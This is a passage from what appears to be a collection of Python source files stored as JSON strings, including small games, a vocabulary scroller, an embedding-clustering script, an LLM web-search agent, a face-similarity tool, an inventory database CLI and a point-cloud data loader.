* Exclude)\n\nprint()\nprint((Progress + Trailer + Exclude + Retriever), \"Outcomes in toatal\")\n\n",
    "import tkinter as tk\nimport csv\nimport random\n\n\n# Read the words from the CSV file\ndef read_words_from_csv(file_path):\n    with open(file_path, 'r', encoding='utf-8') as file:\n        reader = csv.reader(file)\n        # Skip the header\n        next(reader, None)\n        # Return a list of word-meaning pairs\n        return list(reader)\n\n\ndef move_label(label, speed, stop_position):\n    # Get the current position of the label\n    current_position = label.winfo_x()\n\n    # Calculate the new position\n    new_position = current_position - speed\n\n    # Move the label to the new position\n    label.place(x=new_position, y=label.winfo_y())\n\n    # Continue moving the label if it hasn't reached the stop position\n    if new_position > stop_position:\n        label.after(20, move_label, label, speed, stop_position)\n    else:\n        # Once the label has moved past the stop position, update it with a new word\n        update_word(label, word_list)\n\n\n# Function to update the word in the window\ndef update_word(label, word_list):\n    # Select a random word-meaning pair\n    word_pair = random.choice(word_list)\n    japanese, phonetic, english = word_pair\n    # Update the label with the new word\n    label.config(text=f\"{japanese} [{phonetic}] - {english}\")\n\n    # Call this function again after some time\n    label.after(6000, update_word, label, word_list)  # updates every 6 seconds\n\n    # Get the width of the screen and the height of the label\n    screen_width = root.winfo_screenwidth()\n    label_height = label.winfo_reqheight()\n\n    # Reset the label to the right side of the window so it can start scrolling again\n    label.place(x=screen_width, y=random.randint(0, root.winfo_screenheight() - label_height))\n\n    # Start moving the label with a speed of '2' pixels every 20ms\n    # 'stop_position' could be set as '-label.winfo_reqwidth()' to ensure the label scrolls all the way out of view\n    move_label(label, 2, -label.winfo_reqwidth())\n\n\n# Path to the CSV file\nfile_path = 'japanese_words.csv'\n\n# Load the words\nword_list = read_words_from_csv(file_path)\n\n# Create a tkinter window\nroot = tk.Tk()\nroot.title(\"Japanese Vocabulary Barrage\")\n# Make the window borderless\nroot.overrideredirect(True)\n\n# Set the window size and position\n# For example, let's start with 800x100 pixels window width and height, and position it at the top left of the screen\n# root.geometry(\"800x100+0+0\")\n\n# Always on Top\nroot.attributes('-topmost', True)\n# Set a unique background color for the window, like 'systemTransparent'\nroot.configure(bg='#123456')\n# Now make this color transparent\nroot.wm_attributes(\"-transparentcolor\", '#123456')\n\n# Create a label to display words\nword_label = tk.Label(root, font=('Helvetica', 20), fg='white',bg='#123456', text='white')\nword_label.pack(pady=20)\n\n# For transparency\nroot.attributes(\"-alpha\", 0.7)\n# Start updating words\nupdate_word(word_label, word_list)\n\n# Start the GUI loop\nroot.mainloop()\n",
    "import json\nimport numpy as np\nfrom tqdm import tqdm\n\nimport umap\nfrom sklearn.cluster import DBSCAN\nimport plotly.graph_objects as go\nfrom collections import Counter, defaultdict\n\nINPUT_PREFIX   = \"./sharegpt_data/sharegpt-en\"\n\nINPUT_TEXT     = f\"{INPUT_PREFIX}.text.json\"\nINPUT_EMBEDS   = f\"{INPUT_PREFIX}.lora8max_uembeds.jsonl\"\nOUTPUT_LABELS  = f\"{INPUT_PREFIX}.lora8max_dbscan.txt\"\nOUTPUT_VISUAL  = f\"{INPUT_PREFIX}.lora8max_dvisual.jsonl\"\n\n# Load dataset\n\nwith open(INPUT_TEXT, \"r\") as f_t, open(INPUT_EMBEDS, \"r\", encoding=\"utf-8\") as f_e:\n    texts = json.load(f_t)\n    texts = [t.replace(\"\\n\\nAssistant:\", \"<|end_of_turn|>Assistant:\").replace(\"\\n\\nHuman:\", \"<|end_of_turn|>Human:\") for t in texts]\n    embeddings = [e.strip() for e in f_e.readlines()]\n    embeddings = np.array([json.loads(e) for e in embeddings])\n    assert len(texts) == len(embeddings)\n\n    # Assume all embeddings have unit length\n    # Then Euclidean distance ||x - y|| = 2(1 - cos(x, y))\n    # assert np.isclose(np.linalg.norm(embeddings, axis=-1), 1.0).all()\n\nprint(\"DBSCAN clustering from scratch...\")\nkm = DBSCAN(eps=1.0, min_samples=10).fit(embeddings)\nlabels = km.labels_\n\nlabs = sorted(list(set(labels)))\ncounter = Counter(labels)\nprint(\"Totally \"+str(len(labs))+\" labels: \"+str([v for k,v in counter.most_common()]))\nprint(str(counter[-1])+\" are labeled as -1.\")\n\nif -1 in [k for k,v in counter.most_common()[:10]]:\n    common = [k for k,v in counter.most_common()[:10]]\n    common.remove(-1)\nelse:\n    common = [k for k,v in counter.most_common()[:9]]\n    \nmappin = defaultdict(lambda: 10)\nfor i, l in enumerate(common):\n    mappin[l] = i\n\nwith open(OUTPUT_LABELS, \"w\") as f_k:\n    for l in list(labels):\n        f_k.write(str(mappin[l])+\"\\n\")\n\nwith open(OUTPUT_VISUAL, \"w\") as f:\n    for line in zip(texts, embeddings.tolist(), labels.tolist()):\n        f.write(json.dumps({\"text\": line[0], \"embedding\": line[1], \"color\": mappin[line[2]]}, ensure_ascii=False)+\"\\n\")",
    "\"\"\"search_agent.py\n\nUsage:\n    search_agent.py \n        [--domain=domain]\n        [--provider=provider]\n        [--model=model]\n        [--temperature=temp]\n        [--max_pages=num]\n        [--output=text]\n        SEARCH_QUERY\n    search_agent.py --version\n\nOptions:\n    -h --help                           Show this screen.\n    --version                           Show version.\n    -d domain --domain=domain           Limit search to a specific domain\n    -t temp --temperature=temp          Set the temperature of the LLM [default: 0.0]\n    -p provider --provider=provider     Use a specific LLM (choices: bedrock,openai,groq,ollama) [default: openai]\n    -m model --model=model              Use a specific model\n    -n num --max_pages=num              Max number of pages to retrieve [default: 10]\n    -o text --output=text               Output format (choices: text, markdown) [default: markdown]\n\n\"\"\"\n\nimport json\nimport os\nfrom concurrent.futures import ThreadPoolExecutor\nfrom urllib.parse import quote\n\nfrom bs4 import BeautifulSoup\nfrom docopt import docopt\nimport dotenv\n\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.schema import SystemMessage, HumanMessage\nfrom langchain.callbacks import LangChainTracer\nfrom langchain_groq import ChatGroq\nfrom langchain_openai import ChatOpenAI\nfrom langchain_community.chat_models import ChatOllama\nfrom langchain_openai import OpenAIEmbeddings\nfrom langchain_community.vectorstores.faiss import FAISS\nfrom langchain_community.chat_models.bedrock import BedrockChat\nfrom langsmith import Client\n\nimport requests\n\nfrom rich.console import Console\nfrom rich.rule import Rule\nfrom rich.markdown import Markdown\n\n\ndef get_chat_llm(provider, model, temperature=0.0):\n    match provider:\n        case 'bedrock':\n            if(model == None):\n                model = \"anthropic.claude-3-sonnet-20240229-v1:0\"\n            chat_llm = BedrockChat(\n                credentials_profile_name=os.getenv('CREDENTIALS_PROFILE_NAME'),\n                model_id=model,\n                model_kwargs={\"temperature\": temperature },\n            )\n        case 'openai':\n            if(model == None):\n                model = \"gpt-3.5-turbo\"\n            chat_llm = ChatOpenAI(model_name=model, temperature=temperature)\n        case 'groq':\n            if(model == None):\n                model = 'mixtral-8x7b-32768'\n            chat_llm = ChatGroq(model_name=model, temperature=temperature)\n        case 'ollama':\n            if(model == None):\n                model = 'llam2'            \n            chat_llm = ChatOllama(model=model, temperature=temperature)\n        case _:\n            raise ValueError(f\"Unknown LLM provider {provider}\")\n        \n    console.log(f\"Using {model} on {provider} with temperature {temperature}\")        \n    return chat_llm\n\ndef optimize_search_query(query):\n    from messages import get_optimized_search_messages\n    messages = get_optimized_search_messages(query)\n    response = chat.invoke(messages, config={\"callbacks\": callbacks})\n    optimized_search_query = response.content\n    return optimized_search_query.strip('\"').strip(\"**\")\n\n\ndef get_sources(query, max_pages=10, domain=None):       \n    search_query = query\n    if domain:\n        search_query += f\" site:{domain}\"\n\n    url = f\"https://api.search.brave.com/res/v1/web/search?q={quote(search_query)}&count={max_pages}\"\n    headers = {\n        'Accept': 'application/json',\n        'Accept-Encoding': 'gzip',\n        'X-Subscription-Token': os.getenv(\"BRAVE_SEARCH_API_KEY\")\n    }\n\n    try:\n        response = requests.get(url, headers=headers)\n\n        if response.status_code != 200:\n            raise Exception(f\"HTTP error! status: {response.status_code}\")\n\n        json_response = response.json()\n\n        if 'web' not in json_response or 'results' not in json_response['web']:\n            raise Exception('Invalid API response format')\n\n        final_results = [{\n            'title': result['title'],\n            'link': result['url'],\n            'snippet': result['description'],\n            'favicon': result.get('profile', {}).get('img', '')\n        } for result in json_response['web']['results']]\n\n        return final_results\n\n    except Exception as error:\n        #console.log('Error fetching search results:', error)\n        raise\n\n\n\ndef fetch_with_timeout(url, timeout=8):\n    try:\n        response = requests.get(url, timeout=timeout)\n        response.raise_for_status()\n        return response\n    except requests.RequestException as error:\n        #console.log(f\"Skipping {url}! Error: {error}\")\n        return None\n\ndef extract_main_content(html):\n    try:\n        soup = BeautifulSoup(html, 'html.parser')\n        for element in soup([\"script\", \"style\", \"head\", \"nav\", \"footer\", \"iframe\", \"img\"]):\n            element.extract()\n        main_content = ' '.join(soup.body.get_text().split())\n        return main_content\n    except Exception as error:\n        #console.log(f\"Error extracting main content: {error}\")\n  ",
    "import pygame\nimport random\nimport sys\n\nversion = \"v1.3.7\"\n\n# Initialize Pygame\npygame.init()\n\n# Set up the screen\nWIDTH, HEIGHT = 1000, 750\nscreen = pygame.display.set_mode((WIDTH, HEIGHT))\npygame.display.set_caption(\"Sherman Dining: The Game\")\nicon_image = pygame.image.load(\"assets/favicon.ico\")\npygame.display.set_icon(icon_image)\n\n# Colors\nWHITE = (255, 255, 255)\nBLACK = (0, 0, 0)\nRED = (255, 0, 0)\nBLUE = (0, 0, 255)\nGREEN = (0, 255, 0)\n\n# Fonts\ncomic_sans_font = \"assets/COMICSANS.ttf\" \nfont = pygame.font.Font(comic_sans_font, 30)\nmenu_font = pygame.font.Font(comic_sans_font, 40)\ntext_color = BLACK\ntext_bg = WHITE\n\n# Player\nplayer_width = 90\nplayer_height = 90\nplayer_x = WIDTH // 2 - player_width // 2\nplayer_y = HEIGHT - 120\nplayer_image = pygame.transform.scale(pygame.image.load(\"assets/images/plate.png\"), (player_width, player_height)) \nplayer_speed = 15\n\n# Food\nfood_width = 80  \nfood_height = 80  \nfood_speed_default = 3\nfood_speed = food_speed_default\nfood_limit = 12\nfood_generate_delay_default = 35\nfood_generate_delay = food_generate_delay_default\nfood_generate_min = 20  # Delay between generating each food item\ngood_food_images = [\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/07_bread.png\"), (food_width, food_height)),  \n    pygame.transform.scale(pygame.image.load(\"assets/images/food/15_burger.png\"), (food_width, food_height)),  \n    pygame.transform.scale(pygame.image.load(\"assets/images/food/38_friedegg.png\"), (food_width, food_height)),  \n    pygame.transform.scale(pygame.image.load(\"assets/images/food/22_cheesecake.png\"), (food_width, food_height)),  \n    pygame.transform.scale(pygame.image.load(\"assets/images/food/54_hotdog.png\"), (food_width, food_height)), \n    pygame.transform.scale(pygame.image.load(\"assets/images/food/73_omlet.png\"), (food_width, food_height)),  \n    pygame.transform.scale(pygame.image.load(\"assets/images/food/81_pizza.png\"), (food_width, food_height)),  \n    pygame.transform.scale(pygame.image.load(\"assets/images/food/92_sandwich.png\"), (food_width, food_height)), \n    pygame.transform.scale(pygame.image.load(\"assets/images/food/79_pancakes.png\"), (food_width, food_height)),\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/85_roastedchicken.png\"), (food_width, food_height)),\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/88_salmon.png\"), (food_width, food_height)),\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/28_cookies.png\"), (food_width, food_height)),\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/57_icecream.png\"), (food_width, food_height)),\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/67_macncheese.png\"), (food_width, food_height)),\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/44_frenchfries.png\"), (food_width, food_height)),\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/69_meatball.png\"), (food_width, food_height)),\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/94_spaghetti.png\"), (food_width, food_height)),\n    pygame.transform.scale(pygame.image.load(\"assets/images/food/97_sushi.png\"), (food_width, food_height))\n]\nbad_food_image = pygame.transform.scale(pygame.image.load(\"assets/images/food/dubious_food.png\"), (food_width, food_height)) \ngood_food_sound = pygame.mixer.Sound(\"assets/sounds/yum_roblox_turkey_leg.mp3\")\ngood_food_sound.set_volume(0.5)\nbad_food_sound = pygame.mixer.Sound(\"assets/sounds/vine_boom.mp3\")\nbad_food_sound.set_volume(0.3)\n\n# Menu Background\nmenu_bg_image = pygame.image.load(\"assets/images/brandeis_dining.jpg\")\n\n# Game Background\ngame_bg_image = pygame.image.load(\"assets/images/sherman.jpg\")\n\n# Game Over Sound\ngame_over_sound = pygame.mixer.Sound(\"assets/sounds/vomit_sound.mp3\")\n\n# Background Music\nbackground_music = \"assets/sounds/spiderman_game_pizza_theme.mp3\"\npygame.mixer.music.load(background_music)\npygame.mixer.music.set_volume(0.1) \n\n# Game Variables\nscore = 0\nlives = 3\nstart_time = pygame.time.get_ticks()\nfood_list = []\nfood_positions = [] \n\ndef load_high_score():\n    try:\n        with open(\"high_score.txt\", \"r\") as file:\n            return int(file.read())\n    except FileNotFoundError:\n        return 0\n\ndef save_high_score(score):\n    with open(\"high_score.txt\", \"w\") as file:\n        file.write(str(score))\n\n# Load high score\nhigh_score = load_high_score()\n\n# Update high score\ndef update_high_score(score):\n    global high_score\n    if score > high_score:\n        high_score = score\n        save_high_score(high_score)\n\ndef draw_high_score():\n    text_surface = font.render(\"High Score: \" + str(high_score), True, text_color)\n    background_surface = pygame.Surface((text_surface.get_width(), text_surface.get_height()))\n    background_surface.fill(text_bg)\n    screen.blit(background_surface, (WIDTH - text_surface.get_width() - 10, 10))\n    screen.blit(text_surface, (WIDTH - text_surface.get_width() - 10, 10))\n\ndef draw_player(player_x, player_y):\n    screen.blit(player_ima",
    "import numpy as np\nimport matplotlib.pyplot as plt\nimport cv2\nimport os\n\n# A constant size of the image (width , heigth) for resizing the image when computing the histogram\nimageScale = (150,150)\n\n# The database folder\nDB_folder = \"Face_similarity_DB\"\n\n# Obtain a list of the image that was inside the database\ndatabase_name_list = os.listdir(\"Face_similarity_DB\\data\\Images\")\n\n# Obtain a list of the test image that was inside the database\ntest_in_database_name_list = os.listdir(\"Face_similarity_DB\\\\test\\\\Images\\\\inDatabase\")\n\n# Obtain a list of the test image that was not inside the database\ntest_not_in_database_name_list = os.listdir(\"Face_similarity_DB\\\\test\\\\Images\\\\notInDatabase\")\n\n# Define a class with all functions to perform cosineSimilarity with feature extraction from histogram of Oriented Gradients\nclass Similarity:\n    # Initialize the class by putting the name of the test file and if the test file is inside the database or not\n    # inDatabase = 1 -> The test image is not include in the database\n    # inDatabase = 2 -> The test image is not include in the database\n    def __init__(self, test_image, inDatabase):\n        self.test_image = test_image\n        self.inDatabase = inDatabase\n\n    # Function to get the image file in the test folder\n    # self.inDatabase to determine if the test image is in the database or not\n    def accessTestFile(self):\n        return cv2.imread(os.path.join(DB_folder, \"test\", \"Images\",\n                                        \"inDatabase\" if (self.inDatabase) else \"notInDatabase\"\n                                        , self.test_image), 0)\n    \n    # Function to get the image file in the data folder (database)\n    def accessTargetFile(self, filename):\n        return cv2.imread(os.path.join(DB_folder, \"data\", \"Images\", filename), 0)\n    \n    # Function to resize the image\n    def imageResize(self, image):\n        return cv2.resize(image, imageScale)\n    \n    # Function to get the name of the file by deleting the file type\n    def fileNameDelete(self, filename):\n        return filename.split(sep=\".\")[0] \n    \n    # A histogram of Oriented Gradients (HOG) feature extraction function\n    # reutrn the value of feature vector\n    def compute_hog(self ,image, orientations=9, pixels_per_cell=(8, 8), cells_per_block=(3, 3)):\n        # Step 1: Compute gradients\n        gx = cv2.Sobel(image, cv2.CV_64F, 1, 0, ksize=1)\n        gy = cv2.Sobel(image, cv2.CV_64F, 0, 1, ksize=1)\n\n        # Step 2: Compute gradient magnitude and orientation\n        magnitude, angle = cv2.cartToPolar(gx, gy, angleInDegrees=True)\n\n        # Step 3-4: Create histograms and normalize within blocks   \n        histogram = np.zeros((image.shape[0] // pixels_per_cell[0], image.shape[1] // pixels_per_cell[1], orientations))\n\n        for i in range(orientations):\n            # Select pixels with orientations in the current range\n            mask = np.logical_and(angle >= i * (180 / orientations), angle < (i + 1) * (180 / orientations))\n            \n            # Compute histogram for the selected pixels\n            histogram[:, :, i] = np.sum(magnitude * mask, axis=(0, 1))\n\n        # Step 5: Concatenate normalized block histograms to form the feature vector\n        feature_vector = np.concatenate([histogram[i:i + cells_per_block[0], j:j + cells_per_block[1]].ravel()\n                                        for i in range(0, histogram.shape[0], cells_per_block[0])\n                                        for j in range(0, histogram.shape[1], cells_per_block[1])])\n\n        # L2 normalization\n        feature_vector /= np.linalg.norm(feature_vector)\n\n        return feature_vector\n    \n    # Compare the similarity by using cosine_similarity function with feature extraction vector from two images\n    def cosineSimilarity_HOG(self, vector1, vector2):\n        return np.dot(vector1,vector2)/(np.linalg.norm(vector1)*np.linalg.norm(vector2))\n    \n    # Create a list of similarity percentage between the test image and all the image inside the database\n    def similarityList(self):\n        # An Array to store the similarity\n        similarity_list = []\n\n        test_image_file = self.accessTestFile() # Acess the image of the test file\n        test_image_resize = self.imageResize(test_image_file) # resize the test file image\n\n        # Compare the test image with all the image inside the database\n        for target in database_name_list:\n            target_image_file = self.accessTargetFile(target) # acess the image of the target file (image inside the datbase)\n            target_image_resize = self.imageResize(target_image_file) # resize the target image\n        \n            # Compute the histogram of Oriented Gradients (HOG) feature extraction from both target and test image\n            feature_extraction_vector_1 = self.compute_hog(target_image_resize) \n            feature_extraction_vector_2 = self.compute_hog(test_image_resize)\n\n            similarity = self.cosineSimilarity_HOG(feature_extraction_vector_1,feature_extracti",
    "import sqlalchemy\nfrom sqlalchemy.ext.declarative import declarative_base\nfrom sqlalchemy import Column, Integer, String,Date, insert\nfrom sqlalchemy.sql import text\nfrom sqlalchemy.orm import Session\nimport pandas as pd\nfrom datetime import datetime\nimport re\n\nengine = sqlalchemy.create_engine(\"sqlite:///inventory.db\", echo=True)\nBase = declarative_base()\n\nclass product(Base):\n    __tablename__ = \"product\"\n    product_id = Column(Integer, primary_key=True)\n    product_name = Column(String)\n    product_quantity = Column(Integer)\n    product_price = Column(Integer)\n    date_updated = Column(Date)\n    \n\n\ndef load_data_to_database(csv):\n    df = pd.read_csv(csv)\n    df['product_price'] = df[\"product_price\"].apply(lambda x: re.sub(r'[^0-9]','', x))\n    df.reset_index(drop=True, inplace=True)\n    with engine.connect() as conn:\n        df.to_sql(\"product\", conn, if_exists=\"append\", index=False)\n        conn.commit()\n\ndef view_product():\n    print(\"enter product ID:\\n\")\n    id = int(input())\n    with engine.connect() as conn:\n        query = conn.execute(text(f\"SELECT * FROM product WHERE product_id = {id}\"))\n        print(*query)\n\ndef add_product():\n    print(\"Product name: \"); name = input()\n    print(\"Product price: \"); price = int(input()) \n    print(\"Product quantity: \"); quantity = int(input()) \n    date = datetime.now().date()\n\n    stmt = insert(product).values(product_name = name, product_price = price, product_quantity = quantity, date_updated = date)\n    with engine.connect() as conn:\n        conn.execute(stmt)\n        conn.commit()\n        print(\"INSERT SUCCESSFUL\")\n\n\ndef make_backup():\n    with engine.connect() as conn:\n        backup_df = pd.read_sql_query(\"SELECT * FROM product\",conn)\n        backup_df.to_csv(\"./backup.csv\")\n\naction_list = {\"v\": view_product,\n               \"a\": add_product,\n               \"b\": make_backup}\n\ndef create_menu():\n    print(\"\\n---------------------------------------\\n\")\n    print(\"SELECT ACTION:\\n\\\n          v: View details of a product with ID\\n\\\n          a: Add new product\\n\\\n          b: Make backup\")\n    \n    action = input()\n    action_list[action]()\n\n\nif __name__ == \"__main__\":\n    Base.metadata.create_all(engine)\n    load_data_to_database(\"store-inventory\\inventory.csv\")\n    while(True):\n        create_menu()\n",
    "import turtle\r\nimport time\r\nimport random\r\n\r\nwn = turtle.Screen()\r\nwn.title(\"Snake Game\")\r\nwn.bgcolor('yellow')\r\nwn.setup(width=600, height=600)\r\nwn.tracer(0)\r\n\r\nhead = turtle.Turtle()\r\nhead.speed(0)\r\nhead.shape('square')\r\nhead.color('red')\r\nhead.penup()\r\na = random.randint(-290, 290)\r\nb = random.randint(-290, 250)\r\nhead.goto(a, b)\r\nhead.direction = 'stop'\r\n\r\nfood = turtle.Turtle()\r\nfood.speed(0)\r\nfood.shape('triangle')\r\nfood.color('dark green')\r\nfood.penup()\r\nfood.goto(100, 100)\r\n\r\ndef move_up():\r\n    if head.direction != 'down':\r\n        head.direction = 'up'\r\n\r\ndef move_down():\r\n    if head.direction != 'up':\r\n        head.direction = 'down'\r\n\r\ndef move_left():\r\n    if head.direction != 'right':\r\n        head.direction = 'left'\r\n\r\ndef move_right():\r\n    if head.direction != 'left':\r\n        head.direction = 'right'\r\n\r\ndef move():\r\n    if head.direction == 'up':\r\n        y = head.ycor()\r\n        head.sety(y + 20)\r\n    if head.direction == 'down':\r\n        y = head.ycor()\r\n        head.sety(y - 20)\r\n    if head.direction == 'left':\r\n        x = head.xcor()\r\n        head.setx(x - 20)\r\n    if head.direction == 'right':\r\n        x = head.xcor()\r\n        head.setx(x + 20)\r\n\r\nwn.listen()\r\n\r\nwn.onkeypress(move_up, 'w')\r\nwn.onkeypress(move_up, 'W')\r\nwn.onkeypress(move_up, 'Up')\r\nwn.onkeypress(move_down, 's')\r\nwn.onkeypress(move_down, 'S')\r\nwn.onkeypress(move_down, 'Down')\r\nwn.onkeypress(move_left, 'a')\r\nwn.onkeypress(move_left, 'A')\r\nwn.onkeypress(move_left, 'Left')\r\nwn.onkeypress(move_right, 'd')\r\nwn.onkeypress(move_right, 'D')\r\nwn.onkeypress(move_right, 'Right')\r\n\r\ndelay = 0.2\r\nsegments = []\r\nscore = 0\r\nhigh_score = 0\r\n\r\nboard = turtle.Turtle()\r\nboard.speed(0)\r\nboard.shape('square')\r\nboard.color('black')\r\nboard.penup()\r\nboard.hideturtle()\r\nboard.goto(0, 250)\r\nboard.write('Score : 0  High Score : 0', align='center', font=('arial', 20, 'bold'))\r\n\r\nwhile True:\r\n    wn.update()\r\n    \r\n    if head.xcor() > 290 or head.xcor() < -290 or head.ycor() > 290 or head.ycor() < -290:\r\n        time.sleep(1)\r\n        a = random.randint(-290, 290)\r\n        b = random.randint(-290, 250)\r\n        head.goto(a, b)\r\n        head.direction = 'stop'\r\n        for segment in segments:\r\n            segment.goto(400, 400)\r\n        segments.clear()\r\n        score = 0\r\n        board.clear()\r\n        board.write('Score : {}  High Score : {}'.format(score, high_score), align='center', font=('arial', 20, 'bold'))\r\n\r\n    if head.distance(food) < 20:\r\n        x = random.randint(-290, 290)\r\n        y = random.randint(-290, 250)\r\n        food.goto(x, y)\r\n        new_segment = turtle.Turtle()\r\n        new_segment.speed(0)\r\n        new_segment.shape('square')\r\n        new_segment.color('white')\r\n        new_segment.penup()\r\n        segments.append(new_segment)\r\n        score += 10\r\n        if score > high_score:\r\n            high_score = score\r\n        board.clear()\r\n        board.write('Score : {}  High Score : {}'.format(score, high_score), align='center', font=('arial', 20, 'bold'))\r\n\r\n    for index in range(len(segments) - 1, 0, -1):\r\n        x = segments[index - 1].xcor()\r\n        y = segments[index - 1].ycor()\r\n        segments[index].goto(x, y)\r\n\r\n    if len(segments) > 0:\r\n        x = head.xcor()\r\n        y = head.ycor()\r\n        segments[0].goto(x, y)\r\n                \r\n    move()\r\n\r\n    for segment in segments:\r\n        if segment.distance(head) < 20:\r\n            time.sleep(1)\r\n            head.goto(0, 0)\r\n            head.direction = 'stop'\r\n            for segment in segments:\r\n                segment.goto(400, 400)\r\n            segments.clear()\r\n            score = 0\r\n            board.clear()\r\n            board.write('Score : {}  High Score : {}'.format(score, high_score), align='center', font=('arial', 20, 'bold'))\r\n\r\n    time.sleep(delay)\r\n",
    "import pandas as pd\nimport random\n\n# Definindo as op\u00e7\u00f5es para cada atributo\nopcoes = {\n    'Historico_Credito': ['bom', 'medio', 'ruim'],\n    'Renda_Mensal': ['baixa', 'media', 'alta'],\n    'Emprego': ['estavel', 'instavel', 'desempregado'],\n    'Divida_Existente': ['baixa', 'media', 'alta'],\n    'Valor_Emprestimo': ['baixo', 'medio', 'alto'],\n    'Prazo_Emprestimo': ['curto', 'medio', 'longo'],\n    'Idade': ['jovem', 'adulto', 'idoso'],\n    'Educacao': ['sem_formacao', 'graduacao', 'pos_graduacao'],\n    'Finalidade_Emprestimo': ['investimento', 'consumo', 'educacao', 'emergencia'],\n    'Tipo_Moradia': ['propria', 'alugada', 'com_familia'],\n    'Risco': ['Alto', 'Moderado', 'Baixo']\n}\n\n# Gerando 50 solicita\u00e7\u00f5es com valores aleat\u00f3rios\ndados = []\nfor _ in range(50):\n    solicitacao = {atributo: random.choice(valores) for atributo, valores in opcoes.items()}\n    dados.append(solicitacao)\n\n# Criando um DataFrame\ndf = pd.DataFrame(dados)\n\n# Salvando a base de dados em um arquivo Excel\ncaminho_arquivo = 'dados.xlsx'\ndf.to_excel(caminho_arquivo, index=False)",
    "import numpy as np\r\nimport h5py\r\nimport queue\r\nimport threading\r\nimport point_op\r\nimport pc_util\r\nimport random\r\nimport math\r\nimport tensorflow as tf\r\n\r\ndef normalize_point_cloud(input):\r\n    if len(input.shape)==2:\r\n        axis = 0\r\n    elif len(input.shape)==3:\r\n        axis = 1\r\n    centroid = np.mean(input, axis=axis, keepdims=True)\r\n    input = input - centroid\r\n    furthest_distance = np.amax(np.sqrt(np.sum(input ** 2, axis=-1)),axis=axis,keepdims=True)\r\n    if axis == 0:\r\n        input = input / furthest_distance\r\n    if axis == 1:\r\n        input = input / np.expand_dims(furthest_distance, axis=-1)\r\n    return input, centroid,furthest_distance\r\n\r\ndef patch(file):\r\n    data = np.load(file)\r\n    data, centroid, furthest_distance = normalize_point_cloud(data)\r\n    data_radius = np.ones(shape=(len(data)))\r\n    return data, data_radius\r\n\r\ndef load_h5_data(h5_filename='', opts=None, skip_rate = 1, use_randominput=True):\r\n    num_point = opts.num_point\r\n    num_4X_point = int(opts.num_point * 4)\r\n    num_out_point = int(opts.num_point * opts.up_ratio)\r\n\r\n    print(\"h5_filename : \", h5_filename)\r\n    if use_randominput:\r\n        print(\"use randominput, input h5 file is:\", h5_filename)\r\n        f = h5py.File(h5_filename)\r\n        input = f['poisson_%d' % num_4X_point][:]\r\n        gt = f['poisson_%d' % num_out_point][:]\r\n    else:\r\n        print(\"Do not randominput, input h5 file is:\", h5_filename)\r\n        f = h5py.File(h5_filename)\r\n        input = f['poisson_%d' % num_point][:]\r\n        gt = f['poisson_%d' % num_out_point][:]\r\n\r\n    # name = f['name'][:]\r\n    assert len(input) == len(gt)\r\n\r\n    print(\"Normalization the data\")\r\n    data_radius = np.ones(shape=(len(input)))\r\n    centroid = np.mean(gt[:, :, 0:3], axis=1, keepdims=True)\r\n    gt[:, :, 0:3] = gt[:, :, 0:3] - centroid\r\n    furthest_distance = np.amax(np.sqrt(np.sum(gt[:, :, 0:3] ** 2, axis=-1)), axis=1, keepdims=True)\r\n    gt[:, :, 0:3] = gt[:, :, 0:3] / np.expand_dims(furthest_distance, axis=-1)\r\n    input[:, :, 0:3] = input[:, :, 0:3] - centroid\r\n    input[:, :, 0:3] = input[:, :, 0:3] / np.expand_dims(furthest_distance, axis=-1)\r\n\r\n    input = input[::skip_rate]\r\n    gt = gt[::skip_rate]\r\n    data_radius = data_radius[::skip_rate]\r\n    print(\"total %d samples\" % (len(input)))\r\n    # gt = np.load(h5_filename)\r\n    # input = np.load(h5_filename)\r\n    # data_radius = np.ones(shape=(len(input)))\r\n    # centroid = np.mean(gt[:, :, 0:3], axis=1, keepdims=True)\r\n    # gt[:, :, 0:3] = gt[:, :, 0:3] - centroid\r\n    # furthest_distance = np.amax(np.sqrt(np.sum(gt[:, :, 0:3] ** 2, axis=-1)), axis=1, keepdims=True)\r\n    # gt[:, :, 0:3] = gt[:, :, 0:3] / np.expand_dims(furthest_distance, axis=-1)\r\n    # input[:, :, 0:3] = input[:, :, 0:3] - centroid\r\n    # input[:, :, 0:3] = input[:, :, 0:3] / np.expand_dims(furthest_distance, axis=-1)\r\n    #\r\n    # input = input[::skip_rate]\r\n    # gt = gt[::skip_rate]\r\n    # data_radius = data_radius[::skip_rate]\r\n    # print(\"total %d samples\" % (len(input)))\r\n    return input, gt, data_radius\r\n\r\nclass Fetcher(threading.Thread):\r\n    def __init__(self, opts):\r\n        super(Fetcher,self).__init__()\r\n        self.queue = queue.Queue(50)\r\n        self.stopped = False\r\n        self.opts = opts\r\n        self.use_random_input = self.opts.use_non_uniform\r\n        # self.gt_data,self.radius_data = patch(self.opts.train_file)\r\n        self.input_data, self.gt_data, self.radius_data = load_h5_data(self.opts.train_file, opts=self.opts,\r\n                                                                       use_randominput=self.use_random_input)\r\n        self.batch_size = self.opts.batch_size\r\n        self.sample_cnt = self.gt_data.shape[0]\r\n        self.patch_num_point = self.opts.patch_num_point\r\n        self.num_batches = self.sample_cnt//self.batch_size\r\n        self.num_point = opts.num_point\r\n        print (\"NUM_BATCH is %s\"%(self.num_batches))\r\n\r\n    # def run(self):\r\n    #     while not self.stopped:\r\n    #         idx = np.arange(self.sample_cnt)#\u8fd4\u56de\u4ece0\u5230sample_cnt\u6b65\u957f\u4e3a1\u7684\u5e8f\u5217\r\n    #         np.random.shuffle(idx)#\u6253\u4e71\r\n    #         self.input_data = self.input_data[idx, ...]\r\n    #         self.gt_data = self.gt_data[idx, ...]\r\n    #         self.radius_data = self.radius_data[idx, ...]\r\n    #\r\n    #         for batch_idx in range(self.num_batches):\r\n    #             if self.stopped:\r\n    #                 return None\r\n    #             start_idx = batch_idx * self.batch_size\r\n    #             end_idx = (batch_idx + 1) * self.batch_size\r\n    #             batch_input_data = self.input_data[start_idx:end_idx, :, :].copy()\r\n    #             batch_data_gt = self.gt_data[start_idx:end_idx, :, :].copy()\r\n    #             radius = self.radius_data[start_idx:end_idx].copy()\r\n    #\r\n    #             if 